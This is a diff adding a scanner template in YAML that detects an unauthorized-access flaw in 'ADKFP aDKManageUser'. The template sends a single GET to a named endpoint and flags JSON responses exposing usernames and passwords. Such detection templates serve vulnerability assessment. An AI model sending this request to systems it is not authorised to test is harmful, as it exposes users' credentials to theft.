@@ -1,0 +1,27 @@
+id: poc-yaml-adkfp-adkmanageuser-unauthorized-access
+info:
+  name: ADKFP aDKManageUser Unauthorized Access Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: unauthorized-access
+  description: |
+    This template detects unauthorized access vulnerability in ADKFP aDKManageUser by identifying JSON responses containing sensitive user information like usernames and passwords.
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/aDKManageUser/selectCll_2?roleId=2&page=1&limit=10"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"userName\""
+          - "\"password\""
+      - type: word
+        part: header
+        words:
+          - "application/json"
